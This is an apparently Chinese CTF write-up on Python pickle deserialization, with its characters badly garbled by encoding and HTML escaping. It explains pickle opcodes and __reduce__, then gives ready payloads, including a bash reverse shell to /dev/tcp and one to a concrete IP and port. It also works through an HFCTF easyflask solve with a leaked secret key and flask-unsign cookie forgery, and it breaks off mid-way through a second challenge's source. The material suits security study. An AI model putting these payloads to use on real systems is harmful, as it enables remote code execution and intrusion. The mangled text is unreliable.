æ–¹æ³•æ˜¯ä¸éœ€è¦å‚æ•°æ¥æŒ‡å®šåè®®çš„ã€‚\nç”±äºä¸åŒç‰ˆæœ¬åœ¨åˆ©ç”¨çš„æ—¶å€™æ²¡æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œæ‰€ä»¥æœ¬æ–‡ä»¥æœ€æ˜“è¯»çš„ v0 åè®®ä¸ºä¾‹\nopcodeopcode æ˜¯ PVM çš„çµé­‚ï¼Œæ§åˆ¶æ•´ä¸ªæµç¨‹çš„è¿è¡Œ.\nMARK           = b&#x27;(&#x27;   # å‘æ ˆä¸­å‹å…¥ä¸€ä¸ª MARK æ ‡è®°STOP           = b&#x27;.&#x27;   # ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸º pickle.loads() çš„è¿”å›å€¼POP            = b&#x27;0&#x27;   # ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobjectDUP            = b&#x27;2&#x27;   # duplicate top stack itemFLOAT          = b&#x27;F&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ª float å¯¹è±¡INT            = b&#x27;I&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ª int æˆ–è€… bool å¯¹è±¡BININT         = b&#x27;J&#x27;   # push four-byte signed intBININT1        = b&#x27;K&#x27;   # push 1-byte unsigned intLONG           = b&#x27;L&#x27;   # push long; decimal string argumentBININT2        = b&#x27;M&#x27;   # push 2-byte unsigned intNONE           = b&#x27;N&#x27;   # æ ˆä¸­å‹å…¥ NonePERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string argBINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stackREDUCE         = b&#x27;R&#x27;   # ä»æ ˆä¸Šå¼¹å‡ºä¸¤ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆå¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°å¹¶æŠŠç»“æœå‹å›æ ˆSTRING         = b&#x27;S&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytesUNICODE        = b&#x27;V&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ª UNICODE å­—ç¬¦ä¸²å¯¹è±¡BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argumentAPPEND         = b&#x27;a&#x27;   # å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´  append åˆ°ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­BUILD          = b&#x27;b&#x27;   # ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ª å±æ€§å-å±æ€§å€¼ çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®ï¼Œè°ƒç”¨ __setstate__ æˆ– __dict__.update()GLOBAL         = b&#x27;c&#x27;   # è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ– import ä¸€ä¸ªæ¨¡å—ï¼ˆä¼šè°ƒç”¨ import è¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰ï¼Œå‹å…¥æ ˆDICT           = b&#x27;d&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆ key-value å¯¹ï¼‰ï¼Œå¼¹å‡ºç»„åˆï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœEMPTY_DICT     = b&#x27;&#125;&#x27;   # å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸APPENDS        = b&#x27;e&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶ extends åˆ°è¯¥ MARK ä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­GET            = b&#x27;g&#x27;   # å°† memo[n] çš„å‹å…¥æ ˆBINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte argINST           = b&#x27;i&#x27;   # ç›¸å½“äº c å’Œ o çš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte argLIST           = b&#x27;l&#x27;   # ä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨EMPTY_LIST     = b&#x27;]&#x27;   # å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨OBJ            = b&#x27;o&#x27;   # ä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸º callableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬ n ä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœï¼ŒPUT            = b&#x27;p&#x27;   # å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³ memo[n]BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte argLONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte argSETITEM        = b&#x27;s&#x27;   # å°†æ ˆçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸º valueï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸º keyï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸º keyï¼‰ä¸­TUPLE          = b&#x27;t&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œå¼¹å‡ºç»„åˆï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœEMPTY_TUPLE    = b&#x27;)&#x27;   # å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„SETITEMS       = b&#x27;u&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆ key-value å¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥ MARK ä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encodingTRUE           = b&#x27;I01\\n&#x27;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#x27;I00\\n&#x27;  # not an opcode; see INT docs in pickletools.py\n\nå½“ç„¶ï¼Œè¿™äº›éƒ½æ˜¯ v0 åè®®çš„ opcodeï¼Œå…¶ä»–ç‰ˆæœ¬çš„åè®®ä¼šæ–°å¢&#x2F;æ›¿æ¢ä¸€äº› opcode\nä»¥ä¸Šé¢çš„b&#39;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nTest\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVa\\np6\\nI1\\nsb.&#39;ä¸ºä¾‹å­,ç°åœ¨æ¥è§£è¯»ä¸€ä¸‹è¿™ä¸ªååºåˆ—åŒ–ç»“æœ\nc copy_reg _reconstructor: stack[copy_reg._reconstructor]p 0: memo[copy_reg._reconstructor](: stack[(, copy_reg._reconstructor]c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]p 1: memo[copy_reg._reconstructor, __main__.Test]c __builtin__ object: stack[__builtin__.object, __main__.Test, (, copy_reg._reconstructor]p 2: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object]N: stack[None, __builtin__.object, __main__.Test, (, copy_reg._reconstructor]t: stack[(None, __builtin__.object, __main__.Test), copy_reg._reconstructor]p 3: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test)]R stack[&lt;__main__.Test at 0x160578603d0&gt;]p 4: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;](: stack[(, &lt;__main__.Test at 0x160578603d0&gt;]d: stack[&#123;&#125;, &lt;__main__.Test at 0x160578603d0&gt;]p 5: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;, &#123;&#125;]V a: stack[&quot;a&quot;, &lt;__main__.Test at 0x160578603d0&gt;]p 6: memo[copy_reg._reconstructor, __main__.Test, __builtin__.object, (None, __builtin__.object, __main__.Test), &lt;__main__.Test at 0x160578603d0&gt;, &#123;&#125;, &quot;a&quot;]I 1: stack[1, &quot;a&quot;, &lt;__main__.Test at 0x160578603d0&gt;]s: stack[&#123;&quot;a&quot;: 1&#125;, &lt;__main__.Test at 0x160578603d0&gt;]b: stack[&lt;__main__.Test at 0x160578603d0&gt;]  # set a = 1.: []  # è¿”å› &lt;__main__.Test at 0x160578603d0&gt;\n\næ„Ÿè§‰è¿˜æ˜¯å¾ˆéš¾ç†è§£\næ‰€ä»¥ Python å®˜æ–¹æä¾›äº†å·¥å…·ï¼Œå« pickletoolsï¼Œå®ƒçš„ä½œç”¨ä¸»è¦æ˜¯ï¼š\n\nå¯è¯»æ€§è¾ƒå¼ºçš„æ–¹å¼å±•ç¤ºä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼ˆpickletools.disï¼‰\nå¯¹ä¸€ä¸ªåºåˆ—åŒ–ç»“æœè¿›è¡Œä¼˜åŒ–ï¼ˆpickletools.optimizeï¼‰\n\nimport pickletoolsprint(pickletools.dis(serialized))\n\nç»“æœå¦‚ä¸‹:\n    0: c    GLOBAL     &#x27;copy_reg _reconstructor&#x27;   25: p    PUT        0   28: (    MARK   29: c        GLOBAL     &#x27;__main__ Test&#x27;   44: p        PUT        1   47: c        GLOBAL     &#x27;__builtin__ object&#x27;   67: p        PUT        2   70: N        NONE   71: t        TUPLE      (MARK at 28)   72: p    PUT        3   75: R    REDUCE   76: p    PUT        4   79: (    MARK   80: d        DICT       (MARK at 79)   81: p    PUT        5   84: V    UNICODE    &#x27;a&#x27;   87: p    PUT        6   90: I    INT        1   93: s    SETITEM   94: b    BUILD   95: .    STOPhighest protocol among opcodes = 0\n\nå°ç»“ç”±äºåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¿™ä¸ªå¯¹è±¡è¦èƒ½åœ¨å½“å‰ç¯å¢ƒä¸Šä¸‹æ–‡ä¸­åˆ›å»ºï¼Œæ‰€ä»¥åœ¨å®é™…çš„åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œé‚£äº›é»˜è®¤åŠ è½½çš„åº“ã€æ ‡å‡†åº“ï¼ˆå¯è¢«è‡ªåŠ¨ importï¼‰å°±æˆäº†é¦–é€‰çš„ç±»ï¼Œæ¯”å¦‚ osï¼Œå®ƒæœ‰ system æ–¹æ³•ã€‚\nå¯¹äº Python å¯ä»¥è¢« pickle&#x2F;unpickle çš„å¯¹è±¡ä»¥åŠå…¶ä»–ä¸€äº›æ³¨æ„äº‹é¡¹,è¿™é‡Œåˆ—å‡ºå‡ ç‚¹æ¯”è¾ƒé‡è¦çš„:\n\nå‡½æ•°ï¼ˆå†…ç½®å‡½æ•°æˆ–ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼‰åœ¨è¢«å°å­˜æ—¶ï¼Œå¼•ç”¨çš„æ˜¯å‡½æ•°å…¨åï¼ˆè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ lambda å‡½æ•°ä¸å¯ä»¥è¢«å°å­˜ï¼šæ‰€æœ‰çš„åŒ¿åå‡½æ•°éƒ½æœ‰åŒä¸€ä¸ªåå­—ï¼š&lt;lambda&gt;ï¼‰ã€‚è¿™æ„å‘³ç€åªæœ‰å‡½æ•°æ‰€åœ¨çš„æ¨¡å—åï¼Œä¸å‡½æ•°åä¼šè¢«å°å­˜ï¼Œå‡½æ•°ä½“åŠå…¶å±æ€§ä¸ä¼šè¢«å°å­˜ã€‚å› æ­¤ï¼Œåœ¨è§£å°çš„ç¯å¢ƒä¸­ï¼Œå‡½æ•°æ‰€å±çš„æ¨¡å—å¿…é¡»æ˜¯å¯ä»¥è¢«å¯¼å…¥çš„ï¼Œè€Œä¸”æ¨¡å—å¿…é¡»åŒ…å«è¿™ä¸ªå‡½æ•°è¢«å°å­˜æ—¶çš„åç§°ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸\n\nç±»ä¹Ÿåªå°å­˜åç§°ï¼Œæ‰€ä»¥åœ¨è§£å°ç¯å¢ƒä¸­ä¹Ÿæœ‰å’Œå‡½æ•°ç›¸åŒçš„é™åˆ¶ã€‚æ³¨æ„ï¼Œç±»ä½“åŠå…¶æ•°æ®ä¸ä¼šè¢«å°å­˜ï¼Œåªæœ‰å®ä¾‹æ•°æ®ä¼šè¢«å°å­˜ï¼Œæ‰€ä»¥åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ç±»å±æ€§ attr ä¸ä¼šå­˜åœ¨äºè§£å°åçš„ç¯å¢ƒä¸­ï¼š\nimport pickleclass Foo:    attr = &#x27;A class attribute&#x27;picklestring = pickle.dumps(Foo)\n\nå½“å®ä¾‹è§£å°æ—¶ï¼Œå®ƒçš„ __init__() æ–¹æ³•é€šå¸¸ä¸ä¼šè¢«è°ƒç”¨ã€‚å…¶é»˜è®¤åŠ¨ä½œæ˜¯ï¼šå…ˆåˆ›å»ºä¸€ä¸ªæœªåˆå§‹åŒ–çš„å®ä¾‹ï¼Œç„¶åè¿˜åŸå…¶å±æ€§ï¼š\ndef save(obj):    return (obj.__class__, obj.__dict__)def load(cls, attributes):    obj = cls.__new__(cls)    obj.__dict__.update(attributes)    return obj\n\næ”»å‡»æ€è·¯payload çš„æ„é€ åˆ†ä¸ºç”¨é­”æœ¯æ–¹æ³•è‡ªåŠ¨æ„é€ å’Œæ‰‹åŠ¨æ„é€ (æ‰‹æ“ opcode)\nè‡ªåŠ¨æ”»å‡»é¦–å…ˆ,è¿™æ ·åºåˆ—åŒ–æ”»å‡»æ˜¯è¾¾ä¸åˆ°æ”»å‡»ç›®çš„çš„\nimport pickleimport osclass Test:    def __init__(self):        self.a = os.system(&#x27;whoami&#x27;);test = Test()serialized = pickle.dumps(test,protocol=0)print(serialized)\n\nos.system(&quot;whoami&quot;) åœ¨ test = Test() å°±ä¼šè¢«æ‰§è¡Œå®Œæ¯•ï¼Œæ‰€ä»¥è¿™ä¸ªå¯ä»¥è¯´æ˜¯è‡ªå·±æ—¥è‡ªå·±äº†ã€‚\nç›¸å…³é­”æœ¯æ–¹æ³•ä¸Šé¢æåˆ°è¿‡ï¼Œè§£å°çš„æ—¶å€™æ˜¯æœ‰ä¸€ä¸ªé»˜è®¤çš„èµ‹å€¼è¿‡ç¨‹ï¼Œæ—¢ç„¶æ˜¯é»˜è®¤è¡Œä¸ºï¼Œå¾€å¾€æ˜¯æœ‰åŠæ³•è‡ªå®šä¹‰çš„ã€‚Python æä¾›äº†å¾ˆå¤šé­”æœ¯æ–¹æ³•ï¼ˆæ¯”å¦‚æ¯”è¾ƒå¸¸è§çš„ __reduce__ï¼‰ï¼Œæ¥æ”¹å˜è¿™ä¸€é»˜è®¤è¡Œä¸ºã€‚ä¸‹é¢ä¸€èµ·æ¥çœ‹ä¸‹è¿™äº›é­”æœ¯æ–¹æ³•éƒ½æ˜¯æ€ä¹ˆç”¨çš„ï¼ˆä¸‹é¢å‡ ä¸ªæ–¹æ³•çš„ä»‹ç»ï¼Œå†…å®¹å¤§éƒ¨åˆ†éƒ½æ˜¯æ‘˜å½•è‡ªå®˜æ–¹æ–‡æ¡£ï¼‰ã€‚\n__getnewargs_ex__()\né™åˆ¶ï¼š\n\nå¯¹äºä½¿ç”¨ v2 ç‰ˆæˆ–æ›´é«˜ç‰ˆåè®®çš„ pickle æ‰èƒ½ä½¿ç”¨æ­¤æ–¹æ³•\nå¿…é¡»è¿”å›ä¸€å¯¹ (args, kwargs) ç”¨äºæ„å»ºå¯¹è±¡ï¼Œå…¶ä¸­ args æ˜¯è¡¨ç¤ºä½ç½®å‚æ•°çš„ tupleï¼Œè€Œ kwargs æ˜¯è¡¨ç¤ºå‘½åå‚æ•°çš„ dict\n\n__getnewargs_ex__() æ–¹æ³• return çš„å€¼ï¼Œä¼šåœ¨è§£å°æ—¶ä¼ ç»™ __new__() æ–¹æ³•çš„ä½œä¸ºå®ƒçš„å‚æ•°\n\n\n__getnewargs__()é™åˆ¶ï¼š\n\nå¿…é¡»è¿”å›ä¸€ä¸ª tuple ç±»å‹çš„ args\nå¦‚æœå®šä¹‰äº† __getnewargs_ex__()ï¼Œé‚£ä¹ˆ __getnewargs__() å°±ä¸ä¼šè¢«è°ƒç”¨\n\nè¿™ä¸ªæ–¹æ³•ä¸ä¸Šä¸€ä¸ª __getnewargs_ex__() æ–¹æ³•ç±»ä¼¼ï¼Œä½†åªæ”¯æŒä½ç½®å‚æ•°\næ³¨ï¼šåœ¨ Python 3.6 å‰ï¼Œv2ã€v3 ç‰ˆåè®®ä¼šè°ƒç”¨ __getnewargs__()ï¼Œæ›´é«˜ç‰ˆæœ¬åè®®ä¼šè°ƒç”¨ __getnewargs_ex__()\n__setstate__åœ¨ååºåˆ—åŒ–æ—¶è‡ªåŠ¨æ‰§è¡Œã€‚å®ƒå¯ä»¥åœ¨å¯¹è±¡ä»å…¶åºåˆ—åŒ–çŠ¶æ€æ¢å¤æ—¶ï¼Œå¯¹å¯¹è±¡è¿›è¡Œè‡ªå®šä¹‰çš„çŠ¶æ€è¿˜åŸã€‚\n__reduce__æ„é€ æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œï¼Œç±»ä¼¼äºphpä¸­çš„__wakeup\nå¸¸ç”¨payloadæ²¡æœ‰osæ¨¡å—import pickleimport base64 class A(object):    def __reduce__(self):        return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read()&quot;,))    a = A()a = pickle.dumps(a)print(base64.b64encode(a))\n\nç¯å¢ƒæœ‰osæ¨¡å—import pickleimport osimport base64class aaa():    def __reduce__(self):        return(os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;,))a = aaa()payload = pickle.dumps(a)payload = base64.b64encode(payload)print(payload)#æ³¨æ„payloadsç”Ÿæˆçš„shellè„šæœ¬éœ€è¦åœ¨ç›®æ ‡æœºå™¨æ“ä½œç³»ç»Ÿä¸Šæ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™\n\næ‰€ä»¥æœ€å¥½æ‰€æœ‰pocåœ¨linuxä¸Šç”Ÿæˆ\nä¾‹é¢˜[HFCTF 2021 Final]easyflaskä¸Šæ¥æç¤º&#x2F;file&#x3D;index.js\n\nå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–,å…ˆè¯»ä¸ªç¯å¢ƒå˜é‡\n\nè¿™å°±æœ‰flagäº†?çœ‹æ¥æ˜¯éé¢„æœŸ,æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸ªç§˜é’¥\nsecret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh\n\nå†çœ‹çœ‹app&#x2F;source\n#!/usr/bin/python3.6import osimport picklefrom base64 import b64decodefrom flask import Flask, request, render_template, sessionapp = Flask(__name__)app.config[&quot;SECRET_KEY&quot;] = &quot;*******&quot;User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,&#125;)@app.route(&#x27;/&#x27;, methods=(&#x27;GET&#x27;,))def index_handler():    if not session.get(&#x27;u&#x27;):        u = pickle.dumps(User())        session[&#x27;u&#x27;] = u    return &quot;/file?file=index.js&quot;@app.route(&#x27;/file&#x27;, methods=(&#x27;GET&#x27;,))def file_handler():    path = request.args.get(&#x27;file&#x27;)    path = os.path.join(&#x27;static&#x27;, path)    if not os.path.exists(path) or os.path.isdir(path) \\            or &#x27;.py&#x27; in path or &#x27;.sh&#x27; in path or &#x27;..&#x27; in path or &quot;flag&quot; in path:        return &#x27;disallowed&#x27;    with open(path, &#x27;r&#x27;) as fp:        content = fp.read()    return content@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;if __name__ == &#x27;__main__&#x27;:    app.run(&#x27;0.0.0.0&#x27;, port=80, debug=False)\n\næŠ“åŒ…çœ‹çœ‹cookie\n\nå‘ç°jwt,æ¼æ´ä»£ç :\n@app.route(&#x27;/admin&#x27;, methods=(&#x27;GET&#x27;,))def admin_handler():    try:        u = session.get(&#x27;u&#x27;)        if isinstance(u, dict):            u = b64decode(u.get(&#x27;b&#x27;))        u = pickle.loads(u)    except Exception:        return &#x27;uhh?&#x27;    if u.is_admin == 1:        return &#x27;welcome, admin&#x27;    else:        return &#x27;who are you?&#x27;\n\nä¼ªé€ sessionå®ç° è¯»å– u ä¸­çš„ bå€¼,å¯¹bä¸­çš„å€¼è¿›è¡Œååºåˆ—åŒ–,å¯ä»¥ç›´æ¥è§¦å‘RCE\nå¯¹cookieæ•°æ®ç­¾å:\nflask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;payload&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\nä¸€ä¼šå›æ¥æ›¿æ¢payloadã€‚\nåœ¨linuxç³»ç»Ÿä¸‹è¿è¡Œä»¥ä¸‹ä»£ç \nimport osimport pickleimport base64User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (os.system, (&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.122.131.175/2333 0&gt;&amp;1&quot;&#x27;,))&#125;)user=pickle.dumps(User())print(base64.b64encode(user).decode())&quot;&quot;&quot;gASVUQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDZiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjEyMi4xMzEuMTc1LzIzMzMgMD4mMSKUhZRSlC4=&quot;&quot;&quot;\n\nç”Ÿæˆåæ›¿æ¢payload,å¹¶ä¼ªé€ cookie\nflask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\n\n.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmGQ.dppzM5WSDj4VyWzXfRsYX_7E6ng\n\nä½†æ˜¯å¾ˆå¥‡æ€ª,æ€ä¹ˆéƒ½å¼¹ä¸äº†shell,æ”¹ä¸€ä¸‹å‘½ä»¤ç›´æ¥æŠŠflagå¸¦å‡ºæ¥å¥½äº†\nimport osimport pickleimport base64User = type(&#x27;User&#x27;, (object,), &#123;    &#x27;uname&#x27;: &#x27;test&#x27;,    &#x27;is_admin&#x27;: 0,    &#x27;__repr__&#x27;: lambda o: o.uname,    &#x27;__reduce__&#x27;: lambda o: (eval, (&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag &gt; /tmp/1&#x27;)&quot;,))&#125;)user=pickle.dumps(User())print(base64.b64encode(user).decode())&quot;&quot;&quot;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&quot;&quot;&quot;\n\nâ””â”€# flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVSQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwtX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2NhdCAvZmxhZyA+IC90bXAvMScplIWUUpQu&#x27;&#125;&#125;&quot; --secret &quot;glzjin22948575858jfjfjufirijidjitg3uiiuuh&quot;\n\nå¾—åˆ°session\n.eyJ1Ijp7ImIiOiJnQVNWU1FBQUFBQUFBQUNNQ0dKMWFXeDBhVzV6bEl3RVpYWmhiSlNUbEl3dFgxOXBiWEJ2Y25SZlh5Z25iM01uS1M1emVYTjBaVzBvSjJOaGRDQXZabXhoWnlBK0lDOTBiWEF2TVNjcGxJV1VVcFF1In19.aMJmsA.TG8jihGGbB1fpMg_7MiZOtcsJnI\n\nç„¶åå»adminè·¯ç”±ä¸‹æ”¹cookie\n\nç„¶åè®¿é—®\nhttp://85e89518-1277-4f43-b3b3-f147d35a58fe.node5.buuoj.cn:81/file?file=/tmp/1\n\nå¾—åˆ°flag\n\nflag&#123;639e4746-17d1-49aa-9136-ad69a53d4faa&#125;\n\n[0xgame 2023 Notebook]ç¯å¢ƒæ‰¾ä¸åˆ°,ä¸è¿‡ä»ç½‘ä¸Šæ‰¾åˆ°äº†æºç \nfrom flask import Flask, request, render_template, sessionimport pickleimport uuidimport osapp = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] = os.urandom(2).hex()class Note(object):    def __init__(self, name, content):        self._name = name        self._content = content    @property    def name(self):        return self._name        @property    def content(self):        return self._content@app.route(&#x27;/&#x27;)def index():    return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/&lt;path:note_id&gt;&#x27;, methods=[&#x27;GET&#x27;])def view_note(note_id):    notes = session.get(&#x27;notes&#x27;)    if not notes:        return render_template(&#x27;note.html&#x27;, msg=&#x27;You have no notes&#x27;)        note_raw = notes.get(note_id)    if not note_raw:        return render_template(&#x27;note.html&#x27;, msg=&#x27;This note does not exist&#x27;)        note = pickle.loads(note_raw)    return render_template(&#x27;note.html&#x27;, note_id=note_id, note_name=note.name, note_content=note.content)@app.route(&#x27;/add_note&#x27;, methods=[&#x27;POST&#x27;])def add_note():    note_name = request.form.get(&#x27;note_name&#x27;)    note_content = request.form.get(&#x27;note_content&#x27;)    if note_name == &#x27;&#x27; or note_content == &#x27;&#x27;:        return render_template(&#x27;index.html&#x27;, status=&#x27;add_failed&#x27;, msg=&#x27;note name or content is empty&#x27;)        note_id = str(uuid.uuid4())    note = Note(note_name, note_content)    if not session.get(&#x27;notes&#x27;):        session[&#x27;notes&#x27;] = &#123;&#125;        notes = session[&#x27;notes&#x27;]    notes[note_id] = pickle.dumps(note)    session[&#x27;notes&#x27;] = notes    return 